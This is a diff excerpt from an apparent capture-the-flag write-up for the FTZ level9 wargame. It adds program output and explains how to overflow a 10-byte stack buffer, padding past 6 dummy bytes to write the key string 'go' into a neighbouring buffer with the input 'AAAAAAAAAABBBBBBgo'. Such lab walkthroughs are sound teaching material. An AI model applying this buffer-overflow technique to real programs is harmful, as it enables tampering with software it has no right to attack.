@@ -68,7 +68,16 @@ main(){
 }
 
 [level9@ftz tmp]$ gcc -g -o bof bof.c
+
+[level9@ftz tmp]$ ./bof
+It can be overflow : AAAA
+&buf=0xbffff150, &buf2=0xbffff160, distance=0x00000010 / 16 byte
 ```
+The distance buf and buf2 is 16byte, and dummy stack between buf and buf2 is 6byte.
+
+So, you need to input buf(10byte) and dummy(6byte) and the key string("go")
+
+I will input "AAAAAAAAAABBBBBBgo"
 
 ```
 [level9@ftz tmp]$ gdb bof
